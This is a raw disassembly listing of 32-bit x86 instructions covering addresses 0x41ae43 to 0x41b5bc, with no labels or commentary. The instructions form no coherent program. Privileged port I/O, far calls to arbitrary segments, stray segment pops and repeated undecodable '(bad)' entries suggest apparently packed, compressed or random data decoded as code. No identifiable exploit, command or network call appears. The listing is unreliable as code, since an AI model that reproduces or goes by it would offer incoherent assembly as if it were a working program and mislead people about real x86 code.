  41ae43:	psllq  mm7,QWORD PTR [ebp-0x36ff9298]
  41ae4a:	mov    WORD PTR [esi-0x5704e0f],es
  41ae50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae51:	and    dl,BYTE PTR [esi+0x11b18231]
  41ae57:	loope  0x41aed7
  41ae59:	retf   
  41ae5a:	and    bh,BYTE PTR [edx-0x1e]
  41ae5d:	popf   
  41ae5e:	gs enter 0x41f7,0x3a
  41ae63:	call   0xdb04:0x80537f8c
  41ae6a:	dec    ecx
  41ae6b:	into   
  41ae6c:	pop    es
  41ae6d:	call   0xb435f70
  41ae72:	cmp    DWORD PTR [ebp+0x6a992382],esi
  41ae78:	rcr    bl,0xce
  41ae7b:	inc    ecx
  41ae7c:	stc    
  41ae7d:	popa   
  41ae7e:	jbe    0x41aeb8
  41ae80:	inc    ecx
  41ae81:	sbb    ch,bh
  41ae83:	push   es
  41ae84:	dec    esi
  41ae85:	out    0xd0,eax
  41ae87:	pop    ecx
  41ae88:	cli    
  41ae89:	outs   dx,DWORD PTR ds:[esi]
  41ae8a:	fnstsw WORD PTR [esp+eax*1]
  41ae8d:	sbb    eax,0x2af4a206
  41ae92:	mov    ebp,0x66183902
  41ae97:	aaa    
  41ae98:	fdiv   QWORD PTR [edi+0x57]
  41ae9b:	sar    DWORD PTR [edx+eax*4-0x27],1
  41ae9f:	pop    ds
  41aea0:	cmp    al,0x9d
  41aea2:	cli    
  41aea3:	into   
  41aea4:	sub    al,0xce
  41aea6:	aam    0x39
  41aea8:	dec    esp
  41aea9:	(bad)  [ecx+0xfea3b7b]
  41aeaf:	imul   ecx,ebx,0xffffffcd
  41aeb2:	loopne 0x41af1e
  41aeb4:	sub    al,0xaa
  41aeb6:	add    ebp,esi
  41aeb8:	dec    esi
  41aeb9:	scas   al,BYTE PTR es:[edi]
  41aeba:	mov    ecx,0x2b458643
  41aebf:	pop    es
  41aec0:	mov    edx,0xad913cec
  41aec5:	dec    esi
  41aec6:	jp     0x41aef1
  41aec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec9:	dec    BYTE PTR [eax-0x7a0b0061]
  41aecf:	cmp    al,0xcc
  41aed1:	sub    eax,0x73e798d1
  41aed6:	mov    ah,0xd
  41aed8:	jne    0x41ae83
  41aeda:	cmp    eax,0xfb59ceaa
  41aedf:	pushf  
  41aee0:	sub    DWORD PTR [ecx],edx
  41aee2:	sub    BYTE PTR [ebp+edi*8-0x69af5718],ch
  41aee9:	cld    
  41aeea:	and    DWORD PTR [edx-0x3b6c6829],0xb6f90d2b
  41aef4:	add    DWORD PTR [ecx-0x5d],esi
  41aef7:	sbb    BYTE PTR [ebx-0x764e4053],ah
  41aefd:	inc    ecx
  41aefe:	psraw  mm2,QWORD PTR [edx]
  41af01:	(bad)  
  41af02:	call   0x346f:0xed7468b
  41af09:	adc    ah,BYTE PTR ds:0x7172b1e2
  41af0f:	xor    edi,DWORD PTR [esi]
  41af11:	dec    ebx
  41af12:	(bad)  
  41af13:	push   cs
  41af14:	bound  ebx,QWORD PTR ds:0xd25c3313
  41af1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af1b:	aam    0xcb
  41af1d:	adc    esi,DWORD PTR [ecx]
  41af1f:	mov    ebx,DWORD PTR [ebx]
  41af21:	popf   
  41af22:	sbb    al,0xff
  41af24:	inc    edx
  41af25:	outs   dx,DWORD PTR ds:[esi]
  41af26:	mov    DWORD PTR [esi-0x2a5a9b11],ebp
  41af2c:	adc    DWORD PTR [ecx+0x7e28e6cd],edi
  41af32:	jmp    0x9a3c:0x8dcc910a
  41af39:	arpl   WORD PTR [edx-0x3d],di
  41af3c:	bnd call 0xc8696c15
  41af42:	inc    ecx
  41af43:	push   esi
  41af44:	xor    DWORD PTR [esi+0x3056fa9a],esp
  41af4a:	lgs    edi,FWORD PTR [ebp-0x52f3926e]
  41af51:	jnp    0x41aee7
  41af53:	and    edx,esp
  41af55:	lea    ebp,[edi]
  41af57:	ja     0x41aeec
  41af59:	pop    es
  41af5a:	stc    
  41af5b:	(bad)  
  41af5c:	cld    
  41af5d:	in     eax,dx
  41af5e:	test   BYTE PTR [eax],al
  41af60:	cmc    
  41af61:	lock jnp 0x41afbd
  41af64:	out    dx,al
  41af65:	push   ecx
  41af66:	add    eax,0xbb1bc2d7
  41af6b:	in     eax,0xd2
  41af6d:	mov    ds:0x64955a61,eax
  41af72:	adc    eax,0x7513c284
  41af77:	ret    0xf84f
  41af7a:	inc    edi
  41af7b:	(bad)  
  41af7c:	shl    BYTE PTR [esi+0x50],1
  41af7f:	fisttp QWORD PTR [ebx]
  41af81:	cmc    
  41af82:	lahf   
  41af83:	imul   ecx,eax,0xffffffc8
  41af86:	fs jne 0x41afbb
  41af89:	retf   
  41af8a:	jmp    0x7305:0x4cc9ef65
  41af91:	add    eax,0x2439321f
  41af96:	mov    dh,0xe8
  41af98:	inc    edi
  41af99:	je     0x41afc8
  41af9b:	ds nop
  41af9d:	mov    ebp,0x536b63b8
  41afa2:	mov    ds:0xd5b5f755,eax
  41afa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afa8:	and    DWORD PTR [ebp+0x46366184],0xfe3fb81
  41afb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb3:	in     al,0xbc
  41afb5:	mov    esi,fs
  41afb7:	pushf  
  41afb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afb9:	xlat   BYTE PTR ds:[ebx]
  41afba:	or     al,bh
  41afbc:	xor    dh,BYTE PTR [edi]
  41afbe:	inc    ebx
  41afbf:	aaa    
  41afc0:	in     al,0xfe
  41afc2:	rol    esp,cl
  41afc4:	cmp    ebx,ebx
  41afc6:	pop    ds
  41afc7:	adc    DWORD PTR [esp+ebx*1+0x3af533b1],esi
  41afce:	sub    dh,al
  41afd0:	dec    ebp
  41afd1:	popf   
  41afd2:	mov    BYTE PTR ds:0xa243cd18,cl
  41afd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afd9:	adc    edx,DWORD PTR [ebx+0x16b9dee6]
  41afdf:	lea    edi,[esi-0x6c131be3]
  41afe5:	xchg   edx,eax
  41afe6:	pop    ebp
  41afe7:	rcr    BYTE PTR [edx+ebp*8+0x44c7bfd7],1
  41afee:	push   0x61
  41aff0:	xchg   DWORD PTR [esi+edx*8-0x122bf6d4],ebx
  41aff7:	and    al,0xb5
  41aff9:	mov    edi,0xcc2be72e
  41affe:	iret   
  41afff:	push   edx
  41b000:	push   eax
  41b001:	xor    eax,0x8d87777
  41b006:	sbb    BYTE PTR [ecx],bh
  41b008:	imul   ebx,DWORD PTR [ebp-0x4f],0xffffffcb
  41b00c:	and    BYTE PTR [edi-0x77],bh
  41b00f:	fwait
  41b010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b011:	mov    ch,0xbc
  41b013:	int    0x57
  41b015:	into   
  41b016:	jo     0x41b08c
  41b018:	jecxz  0x41afe0
  41b01a:	cmp    BYTE PTR [edx-0x439ba213],0x4b
  41b021:	adc    eax,0xdc92153a
  41b026:	cmp    BYTE PTR [ebp+eax*4+0x6],dh
  41b02a:	ja     0x41b038
  41b02c:	data16 sbb al,0x5
  41b02f:	and    ecx,DWORD PTR [edi+0x7d2fbbf3]
  41b035:	int3   
  41b036:	addr16 and al,0xc6
  41b039:	mov    al,0xf7
  41b03b:	pop    ebp
  41b03c:	nop
  41b03d:	test   al,0x82
  41b03f:	cld    
  41b040:	jg     0x41b069
  41b042:	mov    bh,0x2d
  41b044:	mov    edi,0xa7def96c
  41b049:	ror    BYTE PTR [ecx-0x68c4e885],cl
  41b04f:	call   0x404c:0x6fe19382
  41b056:	pop    ebp
  41b057:	add    esi,DWORD PTR [edi]
  41b059:	cmp    al,0x2a
  41b05b:	js     0x41affe
  41b05d:	mov    cl,0xff
  41b05f:	popa   
  41b060:	or     BYTE PTR [ecx+0x78df180f],al
  41b066:	mov    DWORD PTR [ecx+0x7a754976],ebp
  41b06c:	fs repz push esi
  41b06f:	cmp    ah,BYTE PTR [ebx+0x41c41e80]
  41b075:	add    BYTE PTR [esi-0x4484b1a1],ch
  41b07b:	leave  
  41b07c:	outs   dx,BYTE PTR ds:[esi]
  41b07d:	dec    ecx
  41b07e:	inc    ecx
  41b07f:	stos   BYTE PTR es:[edi],al
  41b080:	adc    al,0x52
  41b082:	and    BYTE PTR [edi+ecx*1+0x592dcfe0],0x56
  41b08a:	aaa    
  41b08b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b08c:	popf   
  41b08d:	xchg   esp,eax
  41b08e:	loop   0x41b067
  41b090:	in     eax,0x6c
  41b092:	push   0x4d
  41b094:	push   0xf85bff23
  41b099:	sbb    DWORD PTR [edx],0xffffffc3
  41b09c:	push   eax
  41b09d:	popa   
  41b09e:	or     bl,bl
  41b0a0:	inc    ebp
  41b0a1:	xor    esi,esp
  41b0a3:	inc    eax
  41b0a4:	fstp   st(1)
  41b0a6:	xchg   esp,eax
  41b0a7:	dec    ebx
  41b0a8:	adc    esp,ecx
  41b0aa:	shl    DWORD PTR [ebx],cl
  41b0ac:	jmp    0x6fe3:0xf4f74069
  41b0b3:	out    0x6,eax
  41b0b5:	popf   
  41b0b6:	mov    dh,0xf6
  41b0b8:	push   ecx
  41b0b9:	cmp    edx,eax
  41b0bb:	mov    dh,BYTE PTR [ebx+0x7d]
  41b0be:	sti    
  41b0bf:	fwait
  41b0c0:	mov    DWORD PTR [esi+0x69],0xe20dc82e
  41b0c7:	pusha  
  41b0c8:	sub    ah,BYTE PTR [edx]
  41b0ca:	test   DWORD PTR [ebp-0x3f5875c4],ebp
  41b0d0:	push   edi
  41b0d1:	pop    edi
  41b0d2:	out    0xed,eax
  41b0d4:	shl    DWORD PTR [edi-0x48b78268],0xb0
  41b0db:	inc    ebx
  41b0dc:	lods   al,BYTE PTR ds:[esi]
  41b0dd:	arpl   ax,bp
  41b0df:	into   
  41b0e0:	pop    ebp
  41b0e1:	icebp  
  41b0e2:	iret   
  41b0e3:	outs   dx,DWORD PTR ds:[esi]
  41b0e4:	dec    ebx
  41b0e5:	sub    esp,DWORD PTR [edi-0x29]
  41b0e8:	fcomp  QWORD PTR [ebx-0x20888ec3]
  41b0ee:	jbe    0x41b124
  41b0f0:	push   ds
  41b0f1:	popf   
  41b0f2:	xchg   esi,eax
  41b0f3:	mov    edi,0x555de017
  41b0f8:	dec    ebp
  41b0f9:	mov    eax,ds:0x6128f3bf
  41b0fe:	ret    
  41b0ff:	(bad)  
  41b101:	ret    0x3a36
  41b104:	mov    ecx,0x8f6a1c92
  41b109:	lods   al,BYTE PTR ds:[esi]
  41b10a:	adc    bh,BYTE PTR [edx]
  41b10c:	sub    al,0xc9
  41b10e:	ret    0xa6a3
  41b111:	mov    cl,ah
  41b113:	je     0x41b179
  41b115:	pop    ebx
  41b116:	cmp    eax,0x76d9425e
  41b11b:	into   
  41b11c:	fld    TBYTE PTR [esi+0x416cc20e]
  41b122:	pushf  
  41b123:	pop    esi
  41b124:	cmp    dh,BYTE PTR [ebp-0x578c64e6]
  41b12a:	loope  0x41b198
  41b12c:	mov    bh,0x4a
  41b12e:	pop    edx
  41b12f:	mov    ch,0x92
  41b131:	jle    0x41b10b
  41b133:	pop    edi
  41b134:	cld    
  41b135:	call   0xcf15b675
  41b13a:	push   ecx
  41b13b:	jmp    0x9502:0xa18c5455
  41b142:	jnp    0x41b0d8
  41b144:	pop    ss
  41b145:	mov    al,ds:0xb993c48e
  41b14a:	cmp    ah,BYTE PTR [ecx]
  41b14c:	xchg   ebx,eax
  41b14d:	in     al,dx
  41b14e:	cmp    DWORD PTR [edi+0x33fabe5c],0xc508e85f
  41b158:	cmp    DWORD PTR [edx-0x16],ebp
  41b15b:	lds    ebp,FWORD PTR ds:0x129ad011
  41b161:	sub    al,0xea
  41b163:	mov    esi,0x26a4119a
  41b168:	or     ch,al
  41b16a:	mov    ecx,0x987be58f
  41b16f:	je     0x41b110
  41b171:	add    eax,0x8b26a1fc
  41b176:	sub    al,0x30
  41b178:	int3   
  41b179:	xor    eax,0x94501304
  41b17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b17f:	retf   0x62df
  41b182:	inc    eax
  41b183:	push   0x61b482dc
  41b188:	mov    esi,0xd069d07c
  41b18d:	out    dx,al
  41b18e:	aas    
  41b18f:	push   ebx
  41b190:	xchg   edi,eax
  41b191:	jnp    0x41b1cc
  41b193:	xchg   DWORD PTR [ebx+0x3a],ebp
  41b196:	sahf   
  41b197:	popa   
  41b198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b199:	shl    dh,1
  41b19b:	mov    ah,0xcf
  41b19d:	cmp    ebp,eax
  41b19f:	aas    
  41b1a0:	xchg   esi,eax
  41b1a1:	into   
  41b1a2:	pop    eax
  41b1a3:	add    al,0xe
  41b1a5:	js     0x41b21c
  41b1a7:	xlat   BYTE PTR ds:[ebx]
  41b1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a9:	pop    ecx
  41b1aa:	rcr    esi,cl
  41b1ac:	jne    0x41b1e0
  41b1ae:	mov    eax,0x5ceda59a
  41b1b3:	cld    
  41b1b4:	xor    dl,BYTE PTR [ecx-0x30b09163]
  41b1ba:	sti    
  41b1bb:	dec    esi
  41b1bc:	outs   dx,BYTE PTR ds:[esi]
  41b1bd:	adc    ah,BYTE PTR [edi+eiz*4+0x3c389a42]
  41b1c4:	popa   
  41b1c5:	and    DWORD PTR [eax+0x21],ebp
  41b1c8:	cmp    al,BYTE PTR [eax-0x661f9f1b]
  41b1ce:	ss call 0x3ae82fda
  41b1d4:	stos   BYTE PTR es:[edi],al
  41b1d5:	mov    DWORD PTR [edx-0x63],ebp
  41b1d8:	push   0x20
  41b1da:	stos   DWORD PTR es:[edi],eax
  41b1db:	sar    edi,cl
  41b1dd:	ds pop esp
  41b1df:	sbb    dl,dl
  41b1e1:	and    al,0xe6
  41b1e3:	sub    BYTE PTR [esi+eax*1],0x45
  41b1e7:	rcl    DWORD PTR [ecx-0x1a],cl
  41b1ea:	xor    ch,BYTE PTR ds:0x143400ae
  41b1f0:	mov    cl,0x7d
  41b1f2:	aas    
  41b1f3:	ins    BYTE PTR es:[edi],dx
  41b1f4:	xchg   edx,eax
  41b1f5:	jecxz  0x41b235
  41b1f7:	mov    edi,ds
  41b1f9:	inc    edx
  41b1fa:	bound  edi,QWORD PTR [edi]
  41b1fc:	pop    ecx
  41b1fd:	adc    eax,0xe55992a7
  41b202:	mov    eax,ds:0x7153f6dc
  41b207:	and    DWORD PTR [esi-0x27],edx
  41b20a:	xchg   ebp,eax
  41b20b:	jle    0x41b1d7
  41b20d:	into   
  41b20e:	or     bl,BYTE PTR [ebp+0x5a]
  41b211:	scas   al,BYTE PTR es:[edi]
  41b212:	nop
  41b213:	pop    ss
  41b214:	push   cs
  41b215:	xchg   edx,eax
  41b216:	stos   DWORD PTR es:[edi],eax
  41b217:	mov    ds:0x607ee477,al
  41b21c:	cdq    
  41b21d:	cmp    DWORD PTR ds:0x2330ef1b,ebx
  41b223:	ja     0x41b1d2
  41b225:	imul   edx,DWORD PTR [eax+0x72],0x9bc38fdc
  41b22c:	cmp    cl,BYTE PTR [edx]
  41b22e:	add    esi,DWORD PTR [edi+0x35780433]
  41b234:	mov    al,0x20
  41b236:	mov    bh,0x70
  41b238:	sbb    bl,BYTE PTR [ecx-0x4bac9d3a]
  41b23e:	push   cs
  41b23f:	test   DWORD PTR ds:[esi+0x196b478b],eax
  41b246:	pop    ebx
  41b247:	imul   ebp,DWORD PTR [eax+0x19],0x524e8773
  41b24e:	xlat   BYTE PTR ds:[ebx]
  41b24f:	add    eax,0x2424a941
  41b254:	dec    eax
  41b255:	mov    ds:0xd6f3d539,al
  41b25a:	mov    eax,0x72a6451
  41b25f:	inc    eax
  41b260:	in     eax,0x80
  41b262:	pop    ebp
  41b263:	push   eax
  41b264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b265:	fst    QWORD PTR [ecx-0xe69cb00]
  41b26b:	aam    0x31
  41b26d:	aad    0xb9
  41b26f:	dec    edx
  41b270:	enter  0x21b8,0x82
  41b274:	and    cl,BYTE PTR [esi-0x3917ab9f]
  41b27a:	and    al,0x16
  41b27c:	fadd   st,st(2)
  41b27e:	mov    eax,0x99eef12b
  41b283:	push   0xffffffcf
  41b285:	pop    ss
  41b286:	xchg   esi,eax
  41b287:	mov    eax,0xbfaf6b81
  41b28c:	push   ss
  41b28d:	and    DWORD PTR [ebx+0x1bf999e2],esp
  41b293:	pop    es
  41b294:	mov    cl,0xe9
  41b296:	retfw  0x1b4a
  41b29a:	sub    al,0x91
  41b29c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b29d:	dec    esi
  41b29e:	xor    al,0xb4
  41b2a0:	cmp    al,0x7e
  41b2a2:	mov    BYTE PTR [edx],cl
  41b2a4:	xchg   DWORD PTR [ebp-0x6d],esp
  41b2a7:	mov    esp,DWORD PTR [edi-0x5ee6ade5]
  41b2ad:	jb     0x41b28d
  41b2af:	into   
  41b2b0:	pop    esi
  41b2b1:	xchg   esi,eax
  41b2b2:	add    al,0x93
  41b2b4:	jae    0x41b2c5
  41b2b6:	ds xchg ebx,eax
  41b2b8:	jle    0x41b32c
  41b2ba:	lahf   
  41b2bb:	leave  
  41b2bc:	enter  0x11ba,0x4b
  41b2c0:	cli    
  41b2c1:	sbb    BYTE PTR [ebx-0x1a65c0b6],ah
  41b2c7:	aas    
  41b2c8:	retf   
  41b2c9:	mov    ecx,0x18d9fbd3
  41b2ce:	xor    BYTE PTR [edx+ebp*1+0x5f002d4a],bl
  41b2d5:	cmp    al,0x41
  41b2d7:	inc    edx
  41b2d8:	mov    ah,0x91
  41b2da:	shl    esi,1
  41b2dc:	aas    
  41b2dd:	sar    BYTE PTR [ebx],cl
  41b2df:	sub    DWORD PTR [esi+0x21b794b5],0x2e587b57
  41b2e9:	and    DWORD PTR [esi],eax
  41b2eb:	cdq    
  41b2ec:	pop    edx
  41b2ed:	loope  0x41b282
  41b2ef:	or     eax,0xac7b7538
  41b2f4:	inc    ebp
  41b2f5:	adc    ch,BYTE PTR [edi]
  41b2f7:	and    bl,dl
  41b2f9:	sub    al,0x82
  41b2fb:	(bad)  
  41b2fc:	scas   eax,DWORD PTR es:[edi]
  41b2fd:	fadd   st(6),st
  41b2ff:	sar    DWORD PTR [esi],cl
  41b301:	add    al,0x47
  41b303:	jns    0x41b33f
  41b305:	cwde   
  41b306:	jne    0x41b2e7
  41b308:	or     BYTE PTR [ecx-0x5fbfaf5d],dh
  41b30e:	icebp  
  41b30f:	leave  
  41b310:	fst    QWORD PTR [ebp+0x44]
  41b313:	ss cwde 
  41b315:	pop    ds
  41b316:	loopne 0x41b30d
  41b318:	xchg   ecx,eax
  41b319:	dec    edx
  41b31a:	push   ecx
  41b31b:	xchg   ebp,eax
  41b31c:	jl     0x41b32a
  41b31e:	stos   BYTE PTR es:[edi],al
  41b31f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b320:	or     eax,0xe14943a8
  41b325:	pop    es
  41b326:	pop    ds
  41b327:	cmp    edx,DWORD PTR [esi]
  41b329:	mov    dl,0xa0
  41b32b:	xor    bl,dh
  41b32d:	cwde   
  41b32e:	mov    ebx,0xd1a0ab0e
  41b333:	inc    eax
  41b334:	or     eax,0x85a95b98
  41b339:	shr    DWORD PTR [ebx-0x6d],cl
  41b33c:	cdq    
  41b33d:	xchg   ebp,eax
  41b33e:	sbb    DWORD PTR [ecx],edi
  41b340:	sub    eax,0x53ad25f7
  41b345:	jo     0x41b3a4
  41b347:	sti    
  41b348:	inc    edx
  41b349:	out    dx,al
  41b34a:	out    dx,eax
  41b34b:	scas   al,BYTE PTR es:[edi]
  41b34c:	inc    ebx
  41b34d:	stc    
  41b34e:	arpl   WORD PTR [eax-0x19],bp
  41b351:	adc    dl,BYTE PTR [ecx-0x716324c5]
  41b357:	xor    al,BYTE PTR [edi-0x53ded65e]
  41b35d:	int3   
  41b35e:	jnp    0x41b325
  41b360:	out    0x4a,al
  41b362:	pop    ecx
  41b363:	imul   eax,eax,0xf018f037
  41b369:	adc    bh,BYTE PTR [ecx+eiz*4]
  41b36c:	push   cs
  41b36d:	cmp    BYTE PTR [eax-0x15049bc4],cl
  41b373:	repz mov bl,0x60
  41b376:	push   ds
  41b377:	pop    ecx
  41b378:	ror    DWORD PTR [edi+0x69],1
  41b37b:	push   ss
  41b37c:	or     DWORD PTR [edi+0x25],ecx
  41b37f:	lods   eax,DWORD PTR ds:[esi]
  41b380:	xchg   ebx,eax
  41b381:	add    eax,0x4309af8c
  41b386:	or     DWORD PTR [edx+0x45],eax
  41b389:	pusha  
  41b38a:	add    al,0x53
  41b38c:	cmp    esi,ecx
  41b38e:	nop
  41b38f:	(bad)  
  41b390:	popa   
  41b391:	shr    BYTE PTR [edx+0x7b],cl
  41b394:	push   ax
  41b396:	arpl   sp,ax
  41b398:	ins    DWORD PTR es:[edi],dx
  41b399:	loopne 0x41b376
  41b39b:	jg     0x41b3f9
  41b39d:	addr16 ss into 
  41b3a0:	add    esi,DWORD PTR [edx]
  41b3a2:	dec    eax
  41b3a3:	shl    ch,cl
  41b3a5:	out    0xa8,eax
  41b3a7:	jb     0x41b420
  41b3a9:	test   eax,0xb960b419
  41b3ae:	lds    esp,FWORD PTR [edx]
  41b3b0:	sub    al,0x53
  41b3b2:	xchg   esi,eax
  41b3b3:	rcr    DWORD PTR [eax-0x792a45f5],0xd7
  41b3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3bb:	mov    edx,DWORD PTR [ebp+0x49]
  41b3be:	xchg   ebx,eax
  41b3bf:	in     eax,dx
  41b3c0:	jp     0x41b371
  41b3c2:	int    0xf3
  41b3c4:	aad    0x3
  41b3c6:	dec    eax
  41b3c7:	mov    ds:0xea98f12b,eax
  41b3cc:	test   DWORD PTR [eax],edx
  41b3ce:	test   DWORD PTR [ecx-0x7d],edi
  41b3d1:	jge    0x41b36b
  41b3d3:	mov    ch,0xd2
  41b3d5:	mov    ch,0x52
  41b3d7:	pop    eax
  41b3d8:	lahf   
  41b3d9:	mov    eax,ds:0xddc2728f
  41b3de:	cmc    
  41b3df:	pop    ecx
  41b3e0:	and    cl,BYTE PTR [edx]
  41b3e2:	je     0x41b3d7
  41b3e4:	pop    edx
  41b3e5:	push   esi
  41b3e6:	dec    esi
  41b3e8:	(bad)  
  41b3ea:	cld    
  41b3eb:	adc    edx,DWORD PTR [ebx-0x1029c963]
  41b3f1:	gs or  ebx,edi
  41b3f4:	xor    eax,0xd9ebce43
  41b3f9:	sub    al,0x8c
  41b3fb:	in     al,0x4d
  41b3fd:	jns    0x41b456
  41b3ff:	xor    DWORD PTR [edi],esi
  41b401:	inc    ebx
  41b402:	iret   
  41b403:	cmp    eax,0xfc1baefa
  41b408:	scas   eax,DWORD PTR es:[edi]
  41b409:	sbb    DWORD PTR [edx-0x2da5f467],0x95dfefd8
  41b413:	imul   ecx,DWORD PTR [edx],0xa0bd9fbe
  41b419:	les    ebx,FWORD PTR [edx+0x14601a6a]
  41b41f:	in     eax,0x6c
  41b421:	mov    al,0x5b
  41b423:	or     BYTE PTR [eax],0x70
  41b426:	adc    cl,cl
  41b428:	retf   
  41b429:	or     esp,DWORD PTR [ebx+0xe]
  41b42c:	inc    ebx
  41b42d:	xor    BYTE PTR [edx+0x464b32c7],ah
  41b433:	xchg   BYTE PTR [ecx],dl
  41b435:	into   
  41b436:	sub    al,0x75
  41b438:	call   0x287e:0x45ae016d
  41b43f:	mov    al,ds:0x7cfe0be8
  41b444:	mov    ebp,0x1e5f7fae
  41b449:	out    dx,eax
  41b44a:	inc    eax
  41b44b:	das    
  41b44c:	cld    
  41b44d:	lds    esi,FWORD PTR [edi]
  41b44f:	enter  0x80c3,0x38
  41b453:	rcl    BYTE PTR [eax],0xc0
  41b456:	dec    ebx
  41b457:	int3   
  41b458:	push   esp
  41b459:	jl     0x41b447
  41b45b:	retf   
  41b45c:	hlt    
  41b45d:	lods   al,BYTE PTR ds:[esi]
  41b45e:	call   0xcfafa464
  41b463:	sbb    al,0x7c
  41b465:	hlt    
  41b466:	and    al,0x8c
  41b468:	shr    DWORD PTR [ecx],0x71
  41b46b:	scas   eax,DWORD PTR es:[edi]
  41b46c:	jae    0x41b456
  41b46e:	mov    esp,0x8d20e7b0
  41b473:	jb     0x41b40e
  41b475:	pop    ecx
  41b476:	pusha  
  41b477:	xor    eax,DWORD PTR [ebx]
  41b479:	lods   eax,DWORD PTR ds:[esi]
  41b47a:	adc    BYTE PTR [ecx],ah
  41b47c:	xor    ecx,DWORD PTR [ebp+ecx*8+0x2deac99a]
  41b483:	aas    
  41b484:	retf   0x19d
  41b487:	aad    0xec
  41b489:	mul    BYTE PTR [ebx-0x12]
  41b48c:	out    dx,eax
  41b48d:	imul   eax,ecx,0xc33da902
  41b493:	out    dx,al
  41b494:	sub    eax,0x12084e61
  41b499:	dec    edx
  41b49a:	or     al,0xa9
  41b49c:	outs   dx,DWORD PTR ds:[esi]
  41b49d:	mov    bl,0x39
  41b49f:	int3   
  41b4a0:	pop    esp
  41b4a1:	retf   
  41b4a2:	push   DWORD PTR [esp+esi*2]
  41b4a5:	pop    DWORD PTR [ebx+edx*1-0x2d71b90b]
  41b4ac:	mov    ?,WORD PTR ds:0x945de7ec
  41b4b2:	call   0x1b78:0x6002e9ba
  41b4b9:	dec    ecx
  41b4ba:	sub    eax,0x2886d90e
  41b4bf:	xor    eax,0x14794075
  41b4c4:	mov    ecx,0x45084f9f
  41b4c9:	stos   DWORD PTR es:[edi],eax
  41b4ca:	adc    eax,0xb9c2bbba
  41b4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d0:	pop    eax
  41b4d1:	mov    edx,0x9783e55a
  41b4d6:	aaa    
  41b4d7:	sub    al,0xc7
  41b4d9:	xor    al,0x68
  41b4db:	inc    esp
  41b4dc:	and    edx,DWORD PTR [ebx]
  41b4de:	hlt    
  41b4df:	cmp    DWORD PTR [edx],edx
  41b4e1:	or     ch,BYTE PTR [ebp+edi*1+0x31342867]
  41b4e8:	mov    bl,dh
  41b4ea:	inc    ebp
  41b4eb:	add    BYTE PTR [edi+ebx*8-0x536fa659],ch
  41b4f2:	inc    BYTE PTR [edi-0x13]
  41b4f5:	aaa    
  41b4f6:	xchg   esp,eax
  41b4f7:	push   esp
  41b4f8:	fcmovu st,st(3)
  41b4fa:	adc    bh,BYTE PTR [eax]
  41b4fc:	xchg   DWORD PTR [esi+0x16510bad],esi
  41b502:	sub    BYTE PTR [ebx],ch
  41b504:	sahf   
  41b505:	div    dh
  41b507:	mov    bh,0x4e
  41b509:	aam    0xb
  41b50b:	cli    
  41b50c:	inc    ebx
  41b50d:	cmp    esi,ebx
  41b50f:	jb     0x41b53b
  41b511:	jmp    0x8eff34d3
  41b516:	jbe    0x41b520
  41b518:	mov    bl,0x68
  41b51a:	lea    ebp,[edx+eiz*8+0x5]
  41b51e:	or     edi,DWORD PTR [ecx+0x4]
  41b521:	sbb    ebx,DWORD PTR ds:0x228e7532
  41b527:	outs   dx,DWORD PTR ds:[esi]
  41b528:	add    ebp,DWORD PTR ds:0x999de0aa
  41b52e:	fwait
  41b52f:	mov    eax,esi
  41b531:	pop    edi
  41b532:	and    esi,DWORD PTR [edi-0x11]
  41b535:	pusha  
  41b536:	sbb    eax,0xb8e3da83
  41b53b:	cld    
  41b53c:	sbb    al,0x40
  41b53e:	xchg   ebp,eax
  41b53f:	inc    ebx
  41b540:	xchg   edi,eax
  41b541:	js     0x41b54f
  41b543:	test   edx,edx
  41b545:	retf   
  41b546:	xor    eax,DWORD PTR [esi]
  41b548:	push   edx
  41b549:	(bad)  
  41b54a:	adc    ebp,esp
  41b54c:	push   eax
  41b54d:	adc    BYTE PTR [ebx-0x5086f6ab],0x53
  41b554:	or     ah,dl
  41b556:	adc    eax,0x63880581
  41b55b:	or     eax,0x3e8d82ae
  41b560:	fistp  WORD PTR [ebx]
  41b562:	xchg   ebp,eax
  41b563:	pop    edx
  41b564:	lds    ecx,FWORD PTR [edx+esi*1]
  41b567:	aaa    
  41b568:	and    edi,DWORD PTR [eax-0x10]
  41b56b:	pop    ebx
  41b56c:	popf   
  41b56d:	add    bl,bl
  41b56f:	or     bh,BYTE PTR [ebp+0x10]
  41b572:	mov    ebx,DWORD PTR [edx]
  41b574:	mov    edi,0x7a8a09ad
  41b579:	(bad)  
  41b57a:	push   eax
  41b57b:	mov    ebp,0xecae57c
  41b580:	xor    BYTE PTR [edi],bh
  41b582:	lods   al,BYTE PTR ds:[esi]
  41b583:	sbb    al,0x32
  41b585:	inc    ecx
  41b586:	mov    esi,0x394efd4c
  41b58b:	ret    0x227f
  41b58e:	pop    ebx
  41b58f:	ds dec esp
  41b591:	(bad)  
  41b592:	sub    BYTE PTR [eax-0xa],ah
  41b595:	adc    ebp,DWORD PTR [edx-0x42]
  41b598:	std    
  41b599:	and    cl,bh
  41b59b:	mov    ecx,0x38a6a2a7
  41b5a0:	cmp    al,0x67
  41b5a2:	cmp    eax,0xbd3d60ff
  41b5a7:	jne    0x41b531
  41b5a9:	aad    0xc5
  41b5ab:	or     eax,0x7be81cac
  41b5b0:	inc    edi
  41b5b1:	or     ch,BYTE PTR [ebx]
  41b5b3:	push   ds
  41b5b4:	dec    eax
  41b5b5:	pushf  
  41b5b6:	pusha  
  41b5b7:	mov    edi,0x3c5b6755
  41b5bc:	sbb    DWORD PTR [eax],eax
